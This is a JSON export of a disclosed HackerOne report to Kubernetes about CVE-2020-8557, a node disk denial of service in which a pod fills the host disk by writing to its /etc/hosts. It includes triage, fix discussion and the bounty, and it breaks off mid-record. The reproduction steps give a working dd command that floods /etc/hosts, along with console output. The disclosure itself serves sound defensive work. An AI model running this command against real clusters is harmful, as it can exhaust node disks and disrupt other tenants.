{"id":867699,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84Njc2OTk=","url":"https://hackerone.com/reports/867699","title":"Node disk DOS by writing to container /etc/hosts","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-05-07T07:11:29.039Z","submitted_at":"2020-05-07T07:11:29.039Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"kebe","url":"/kebe","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":39386,"url":"https://hackerone.com/kubernetes","handle":"kubernetes","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Kubernetes","twitter_handle":"kubernetesio","website":"https://kubernetes.io/","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8557"],"singular_disclosure_disabled":false,"disclosed_at":"2020-07-22T01:34:00.937Z","bug_reporter_agreed_on_going_public_at":"2020-07-22T01:34:00.874Z","team_member_agreed_on_going_public_at":"2020-07-21T19:17:17.411Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Report Submission Form\n\n## Summary:\nPod files /etc/hosts, /etc/hostname, /etc/resolve.conf are not readonly.\nA normal pod running in kubernetes cluster can kil a host through write data to /etc/hosts.\nNot only /etc/hosts, but also /etc/resolve.conf and /etc/hostname can do this.\n\n## Kubernetes Version:\n\u003c=1.18\n\n## Component Version:\nDocker 19.03\n\n## Steps To Reproduce:\n\n  1. use kubectl create a pod like kubectl run \n  2. run `kubectl exec -it $POD_NAME -- dd if=/dev/zero of=/etc/hosts count=1000000 bs=10M`\n  3. run `df -h /var/lib/kubelet` on host that pod running, you can see the disk avaliable space are decreasing until the disk full.\n\n## Supporting Material/References:\n```console\n[root@kebe-sm-315 ~]# kubectl exec -it rate-c848c5c8b-5b8vm sh\nkubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl kubectl exec [POD] -- [COMMAND] instead.\nDefaulting container name to rate.\nUse 'kubectl describe pod/rate-c848c5c8b-5b8vm -n default' to see all of the containers in this pod.\n/ # df -h\nFilesystem                Size      Used Available Use% Mounted on\n/dev/mapper/docker-8:16-67108930-710dfe5c781bd17e11968371b9d0f84641a2efde95c68a47eddf9ae518e768d1\n                         10.0G     40.3M     10.0G   0% /\ntmpfs                    64.0M         0     64.0M   0% /dev\ntmpfs                     9.7G         0      9.7G   0% /sys/fs/cgroup\n/dev/mapper/centos-root\n                         53.0G     28.6G     24.4G  54% /dev/termination-log\n/dev/sdb                100.0G     40.9G     59.1G  41% /etc/resolv.conf\n/dev/sdb                100.0G     40.9G     59.1G  41% /etc/hostname\n/dev/mapper/centos-root\n                         53.0G     28.6G     24.4G  54% /etc/hosts\nshm                      64.0M      8.0K     64.0M   0% /dev/shm\ntmpfs                     9.7G     12.0K      9.7G   0% /var/run/secrets/kubernetes.io/serviceaccount\ntmpfs                     9.7G         0      9.7G   0% /proc/acpi\ntmpfs                    64.0M         0     64.0M   0% /proc/kcore\ntmpfs                    64.0M         0     64.0M   0% /proc/keys\ntmpfs                    64.0M         0     64.0M   0% /proc/timer_list\ntmpfs                    64.0M         0     64.0M   0% /proc/timer_stats\ntmpfs                    64.0M         0     64.0M   0% /proc/sched_debug\ntmpfs                     9.7G         0      9.7G   0% /proc/scsi\ntmpfs                     9.7G         0      9.7G   0% /sys/firmware\n\n[root@kebe-sm-315 86aae92d-e0f2-4cf5-bb85-039b416f6b66]# ls -al\n总用量 12\ndrwxr-xr-x  5 root root   71 5月   7 12:29 .\ndrwxr-x--- 50 root root 4096 5月   7 12:29 ..\ndrwxr-x---  5 root root   55 5月   7 12:31 containers\n-rw-r--r--  1 root root  270 5月   7 12:31 etc-hosts\ndrwxr-x---  3 root root   37 5月   7 12:29 plugins\ndrwxr-xr-x  4 root root   65 5月   7 12:29 volumes\n[root@kebe-sm-315 86aae92d-e0f2-4cf5-bb85-039b416f6b66]# kubectl exec -it rate-c848c5c8b-5b8vm -- dd if=/dev/zero of=/etc/hosts count=100 bs=1M\nDefaulting container name to rate.\nUse 'kubectl describe pod/rate-c848c5c8b-5b8vm -n default' to see all of the containers in this pod.\n100+0 records in\n100+0 records out\n[root@kebe-sm-315 86aae92d-e0f2-4cf5-bb85-039b416f6b66]# ls -al\n总用量 102408\ndrwxr-xr-x  5 root root        71 5月   7 12:29 .\ndrwxr-x--- 50 root root      4096 5月   7 12:29 ..\ndrwxr-x---  5 root root        55 5月   7 12:31 containers\n-rw-r--r--  1 root root 104857600 5月   7 15:06 etc-hosts\ndrwxr-x---  3 root root        37 5月   7 12:29 plugins\ndrwxr-xr-x  4 root root        65 5月   7 12:29 volumes\n```\n\n  * [attachment / reference]\n\n## Impact\n\nIf someone create a pod on a public cloud with kubernetes, the host of the provider may panic due to disk full.","vulnerability_information_html":"\u003cp\u003eReport Submission Form\u003c/p\u003e\n\n\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003ePod files /etc/hosts, /etc/hostname, /etc/resolve.conf are not readonly.\u003cbr\u003e\nA normal pod running in kubernetes cluster can kil a host through write data to /etc/hosts.\u003cbr\u003e\nNot only /etc/hosts, but also /etc/resolve.conf and /etc/hostname can do this.\u003c/p\u003e\n\n\u003ch2 id=\"kubernetes-version\"\u003eKubernetes Version:\u003c/h2\u003e\n\n\u003cp\u003e\u0026lt;=1.18\u003c/p\u003e\n\n\u003ch2 id=\"component-version\"\u003eComponent Version:\u003c/h2\u003e\n\n\u003cp\u003eDocker 19.03\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003euse kubectl create a pod like kubectl run \u003c/li\u003e\n\u003cli\u003erun \u003ccode\u003ekubectl exec -it $POD_NAME -- dd if=/dev/zero of=/etc/hosts count=1000000 bs=10M\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003erun \u003ccode\u003edf -h /var/lib/kubelet\u003c/code\u003e on host that pod running, you can see the disk avaliable space are decreasing until the disk full.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight console\"\u003e\u003ccode\u003e\u003cspan class=\"gp\"\u003e[root@kebe-sm-315 ~]#\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003ekubectl \u003cspan class=\"nb\"\u003eexec\u003c/span\u003e \u003cspan class=\"nt\"\u003e-it\u003c/span\u003e rate-c848c5c8b-5b8vm sh\n\u003cspan class=\"go\"\u003ekubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl kubectl exec [POD] -- [COMMAND] instead.\nDefaulting container name to rate.\nUse \u0026#39;kubectl describe pod/rate-c848c5c8b-5b8vm -n default\u0026#39; to see all of the containers in this pod.\n\u003c/span\u003e\u003cspan class=\"gp\"\u003e/ #\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nb\"\u003edf\u003c/span\u003e \u003cspan class=\"nt\"\u003e-h\u003c/span\u003e\n\u003cspan class=\"go\"\u003eFilesystem                Size      Used Available Use% Mounted on\n/dev/mapper/docker-8:16-67108930-710dfe5c781bd17e11968371b9d0f84641a2efde95c68a47eddf9ae518e768d1\n                         10.0G     40.3M     10.0G   0% /\ntmpfs                    64.0M         0     64.0M   0% /dev\ntmpfs                     9.7G         0      9.7G   0% /sys/fs/cgroup\n/dev/mapper/centos-root\n                         53.0G     28.6G     24.4G  54% /dev/termination-log\n/dev/sdb                100.0G     40.9G     59.1G  41% /etc/resolv.conf\n/dev/sdb                100.0G     40.9G     59.1G  41% /etc/hostname\n/dev/mapper/centos-root\n                         53.0G     28.6G     24.4G  54% /etc/hosts\nshm                      64.0M      8.0K     64.0M   0% /dev/shm\ntmpfs                     9.7G     12.0K      9.7G   0% /var/run/secrets/kubernetes.io/serviceaccount\ntmpfs                     9.7G         0      9.7G   0% /proc/acpi\ntmpfs                    64.0M         0     64.0M   0% /proc/kcore\ntmpfs                    64.0M         0     64.0M   0% /proc/keys\ntmpfs                    64.0M         0     64.0M   0% /proc/timer_list\ntmpfs                    64.0M         0     64.0M   0% /proc/timer_stats\ntmpfs                    64.0M         0     64.0M   0% /proc/sched_debug\ntmpfs                     9.7G         0      9.7G   0% /proc/scsi\ntmpfs                     9.7G         0      9.7G   0% /sys/firmware\n\n\u003c/span\u003e\u003cspan class=\"gp\"\u003e[root@kebe-sm-315 86aae92d-e0f2-4cf5-bb85-039b416f6b66]#\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nb\"\u003els\u003c/span\u003e \u003cspan class=\"nt\"\u003e-al\u003c/span\u003e\n\u003cspan class=\"go\"\u003e总用量 12\ndrwxr-xr-x  5 root root   71 5月   7 12:29 .\ndrwxr-x--- 50 root root 4096 5月   7 12:29 ..\ndrwxr-x---  5 root root   55 5月   7 12:31 containers\n-rw-r--r--  1 root root  270 5月   7 12:31 etc-hosts\ndrwxr-x---  3 root root   37 5月   7 12:29 plugins\ndrwxr-xr-x  4 root root   65 5月   7 12:29 volumes\n\u003c/span\u003e\u003cspan class=\"gp\"\u003e[root@kebe-sm-315 86aae92d-e0f2-4cf5-bb85-039b416f6b66]#\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003ekubectl \u003cspan class=\"nb\"\u003eexec\u003c/span\u003e \u003cspan class=\"nt\"\u003e-it\u003c/span\u003e rate-c848c5c8b-5b8vm \u003cspan class=\"nt\"\u003e--\u003c/span\u003e \u003cspan class=\"nb\"\u003edd \u003c/span\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/zero \u003cspan class=\"nv\"\u003eof\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/etc/hosts \u003cspan class=\"nv\"\u003ecount\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e100 \u003cspan class=\"nv\"\u003ebs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1M\n\u003cspan class=\"go\"\u003eDefaulting container name to rate.\nUse \u0026#39;kubectl describe pod/rate-c848c5c8b-5b8vm -n default\u0026#39; to see all of the containers in this pod.\n100+0 records in\n100+0 records out\n\u003c/span\u003e\u003cspan class=\"gp\"\u003e[root@kebe-sm-315 86aae92d-e0f2-4cf5-bb85-039b416f6b66]#\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nb\"\u003els\u003c/span\u003e \u003cspan class=\"nt\"\u003e-al\u003c/span\u003e\n\u003cspan class=\"go\"\u003e总用量 102408\ndrwxr-xr-x  5 root root        71 5月   7 12:29 .\ndrwxr-x--- 50 root root      4096 5月   7 12:29 ..\ndrwxr-x---  5 root root        55 5月   7 12:31 containers\n-rw-r--r--  1 root root 104857600 5月   7 15:06 etc-hosts\ndrwxr-x---  3 root root        37 5月   7 12:29 plugins\ndrwxr-xr-x  4 root root        65 5月   7 12:29 volumes\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003e[attachment / reference]\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eIf someone create a pod on a public cloud with kubernetes, the host of the provider may panic due to disk full.\u003c/p\u003e\n","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-08-20T19:17:17.514Z","allow_singular_disclosure_after":-11274381.535985984,"singular_disclosure_allowed":true,"vote_count":158,"voters":["0xl0v3r","black_wheatear","jatindhankhar","mik317","miraclee","hannanhaseeb","prophet","youngsheldon","aporlorxl23","realtess","and 148 more..."],"severity":{"rating":"medium","score":5.5,"author_type":"Team","metrics":{"attack_vector":"local","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"high"}},"structured_scope":{"databaseId":32459,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/kubernetes/kubernetes","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":7928711,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @kebe - Thanks for the submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/kebe\"\u003e@kebe\u003c/a\u003e - Thanks for the submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-07T17:06:44.900Z","updated_at":"2020-05-07T17:06:44.900Z","actor":{"username":"tuxedo","cleared":false,"url":"/tuxedo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7930702,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-07T19:12:55.416Z","updated_at":"2020-05-07T19:12:55.416Z","additional_data":{"old_severity":"High","new_severity":"Medium (4.3)","old_severity_id":713810,"new_severity_id":714666},"actor":{"username":"tuxedo","cleared":false,"url":"/tuxedo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7930703,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you @kebe! I was able to validate your report, and have submitted it to the appropriate remediation team for review. You will be updated on the status of this report as soon as there is additional information to share. Please note that the status and severity are subject to change.","markdown_message":"\u003cp\u003eThank you \u003ca href=\"/kebe\"\u003e@kebe\u003c/a\u003e! I was able to validate your report, and have submitted it to the appropriate remediation team for review. You will be updated on the status of this report as soon as there is additional information to share. Please note that the status and severity are subject to change.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-07T19:13:06.166Z","updated_at":"2020-05-07T19:13:06.166Z","actor":{"username":"tuxedo","cleared":false,"url":"/tuxedo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7933097,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-07T23:33:19.258Z","updated_at":"2020-05-07T23:33:19.258Z","additional_data":{"added_weaknesses":[{"id":48,"name":"Denial of Service"}],"removed_weaknesses":[{"id":8,"name":"Out-of-bounds Read"}]},"actor":{"username":"jk1joel","cleared":false,"url":"/jk1joel","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7933100,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-07T23:33:44.537Z","updated_at":"2020-05-07T23:33:44.537Z","additional_data":{"old_severity":"Medium (4.3)","new_severity":"Medium (6.5)","old_severity_id":714666,"new_severity_id":714935},"actor":{"username":"jk1joel","cleared":false,"url":"/jk1joel","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7933355,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-08T00:21:12.177Z","updated_at":"2020-05-08T00:21:12.177Z","additional_data":{"old_title":"A normal pod can panic a host","new_title":"Node disk DOS by writing to container /etc/hosts"},"actor":{"username":"jk1joel","cleared":false,"url":"/jk1joel","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7995818,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@jk1joel hello, is there any update on this issue? or more details should be added?\n","markdown_message":"\u003cp\u003e\u003ca href=\"/jk1joel\"\u003e@jk1joel\u003c/a\u003e hello, is there any update on this issue? or more details should be added?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-14T03:59:08.224Z","updated_at":"2020-05-14T03:59:08.224Z","actor":{"username":"kebe","cleared":false,"url":"/kebe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7995867,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thank you for this report. While writes to `/etc/hostname` and `/etc/resolv.conf` can be constrained by adding memory resource limits to the pod, no resource limiting will constrain writes to `/etc/hosts` and so we consider that finding valid. Although we are awarding the bounty now, we have not resolved the issue yet and would like to delay disclosure until we can make a proper fix.  We will post updates soon.","markdown_message":"\u003cp\u003eThank you for this report. While writes to \u003ccode\u003e/etc/hostname\u003c/code\u003e and \u003ccode\u003e/etc/resolv.conf\u003c/code\u003e can be constrained by adding memory resource limits to the pod, no resource limiting will constrain writes to \u003ccode\u003e/etc/hosts\u003c/code\u003e and so we consider that finding valid. Although we are awarding the bounty now, we have not resolved the issue yet and would like to delay disclosure until we can make a proper fix.  We will post updates soon.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-14T04:13:18.481Z","updated_at":"2020-05-14T04:13:18.481Z","actor":{"url":"/kubernetes","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Kubernetes"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"kubernetes","collaborator":{"username":"kebe","url":"/kebe"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7995882,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-14T04:16:27.312Z","updated_at":"2020-05-14T04:16:27.312Z","cve_ids":["CVE-2020-8557"],"actor":{"username":"jk1joel","cleared":false,"url":"/jk1joel","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8093660,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello, as a developer, I am very interested in the solution to this problem, I have also thought about some solutions, but none seem to be perfect, would you please share me some ideas?","markdown_message":"\u003cp\u003eHello, as a developer, I am very interested in the solution to this problem, I have also thought about some solutions, but none seem to be perfect, would you please share me some ideas?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-25T04:59:57.153Z","updated_at":"2020-05-25T05:03:47.350Z","actor":{"username":"kebe","cleared":false,"url":"/kebe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8110850,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We're exploring changing the handling of `/etc/hosts` to match the handling of `/etc/{hostname,resolv.conf}`. That is, just write the file directly into the container rather than bind mounting it.","markdown_message":"\u003cp\u003eWe\u0026#39;re exploring changing the handling of \u003ccode\u003e/etc/hosts\u003c/code\u003e to match the handling of \u003ccode\u003e/etc/{hostname,resolv.conf}\u003c/code\u003e. That is, just write the file directly into the container rather than bind mounting it.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-26T18:25:23.127Z","updated_at":"2020-05-26T18:25:23.127Z","actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8139739,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-05-29T00:28:09.510Z","updated_at":"2020-05-29T00:28:09.510Z","additional_data":{"old_severity":"Medium (6.5)","new_severity":"Medium (5.5)","old_severity_id":714935,"new_severity_id":735205},"actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8249698,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tallclair emmm, I noticed that `/etc/hosts` should be synced for all containers, if we move it to container, once changed occur in a container, others can't get that change.\nI have another idea, I don't know its correctness, share with you, hope to get some feedback.\n\nCreate a tmpfs for pod hosts file locate in /var/lib/kubelet/\u003cPODID\u003e/etc with a limited size, write hosts file to /var/lib/kubelet/\u003cPODID\u003e/etc/hosts.\n\n","markdown_message":"\u003cp\u003e\u003ca href=\"/tallclair\"\u003e@tallclair\u003c/a\u003e emmm, I noticed that \u003ccode\u003e/etc/hosts\u003c/code\u003e should be synced for all containers, if we move it to container, once changed occur in a container, others can\u0026#39;t get that change.\u003cbr\u003e\nI have another idea, I don\u0026#39;t know its correctness, share with you, hope to get some feedback.\u003c/p\u003e\n\n\u003cp\u003eCreate a tmpfs for pod hosts file locate in /var/lib/kubelet/\u0026lt;PODID\u0026gt;/etc with a limited size, write hosts file to /var/lib/kubelet/\u0026lt;PODID\u0026gt;/etc/hosts.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-10T04:04:53.152Z","updated_at":"2020-06-10T04:04:53.152Z","actor":{"username":"kebe","cleared":false,"url":"/kebe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8256117,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"For the short term fix, we're now looking at just adding accounting fro the /etc/hosts file, so that it counts towards the pods storage quota.","markdown_message":"\u003cp\u003eFor the short term fix, we\u0026#39;re now looking at just adding accounting fro the /etc/hosts file, so that it counts towards the pods storage quota.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-10T16:10:58.572Z","updated_at":"2020-06-10T16:10:58.572Z","actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8586550,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@kebe we are planning on publishing information about this issue as CVE-2020-8557 on Wednesday, July 15, 2020. Would you like to be credited in our announcement? If so, how would you like us to list you?  Some researchers prefer \"Full Name, Company Name\", some prefer just their name. Please let us know.","markdown_message":"\u003cp\u003e\u003ca href=\"/kebe\"\u003e@kebe\u003c/a\u003e we are planning on publishing information about this issue as CVE-2020-8557 on Wednesday, July 15, 2020. Would you like to be credited in our announcement? If so, how would you like us to list you?  Some researchers prefer \u0026quot;Full Name, Company Name\u0026quot;, some prefer just their name. Please let us know.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-13T18:43:32.874Z","updated_at":"2020-07-13T18:43:32.874Z","actor":{"username":"jk1joel","cleared":false,"url":"/jk1joel","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8589349,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"My full name is Kebe Liu, works on DaoCloud, China.\nI feel very honored for that.\nThanks!","markdown_message":"\u003cp\u003eMy full name is Kebe Liu, works on DaoCloud, China.\u003cbr\u003e\nI feel very honored for that.\u003cbr\u003e\nThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-14T01:29:01.722Z","updated_at":"2020-07-14T01:29:01.722Z","actor":{"username":"kebe","cleared":false,"url":"/kebe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8612436,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"https://groups.google.com/g/kubernetes-security-announce/c/cB_JUsYEKyY","markdown_message":"\u003cp\u003e\u003ca title=\"https://groups.google.com/g/kubernetes-security-announce/c/cB_JUsYEKyY\" href=\"/redirect?url=https%3A%2F%2Fgroups.google.com%2Fg%2Fkubernetes-security-announce%2Fc%2FcB_JUsYEKyY\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://groups.google.com/g/kubernetes-security-announce/c/cB_JUsYEKyY\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-15T21:25:44.269Z","updated_at":"2020-07-15T21:25:44.269Z","actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"kebe","url":"/kebe"},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8612453,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Corrected link: https://groups.google.com/forum/#!topic/kubernetes-security-announce/cB_JUsYEKyY","markdown_message":"\u003cp\u003eCorrected link: \u003ca title=\"https://groups.google.com/forum/#!topic/kubernetes-security-announce/cB_JUsYEKyY\" href=\"/redirect?url=https%3A%2F%2Fgroups.google.com%2Fforum%2F%23%21topic%2Fkubernetes-security-announce%2FcB_JUsYEKyY\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://groups.google.com/forum/#!topic/kubernetes-security-announce/cB_JUsYEKyY\u003c/span\u003e\u003ci 